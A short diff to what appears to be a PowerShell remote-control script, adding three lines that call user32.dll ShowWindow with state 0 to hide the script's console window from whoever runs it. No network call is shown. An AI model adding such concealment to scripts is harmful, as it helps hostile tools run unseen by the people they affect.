@@ -12,6 +12,10 @@ USAGE
 
 $ip = "$NCurl"
 
+$Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
+add-type -name win -member $Import -namespace native;
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
+
 Function options{
 Write-Output "=====================================  MAIN  ========================================"
 Write-Output "Options              - Show this Menu"
